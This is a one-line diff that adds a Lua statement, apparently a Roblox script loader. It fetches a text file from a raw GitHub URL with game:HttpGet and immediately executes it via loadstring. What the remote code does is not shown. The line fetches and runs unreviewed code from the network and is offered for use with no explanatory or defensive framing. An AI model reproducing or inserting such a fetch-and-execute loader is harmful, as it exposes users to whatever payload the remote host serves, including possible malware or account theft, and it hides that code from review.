@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SavaLava9/joijoiiojjlk/main/scriptdaddy.txt"))()
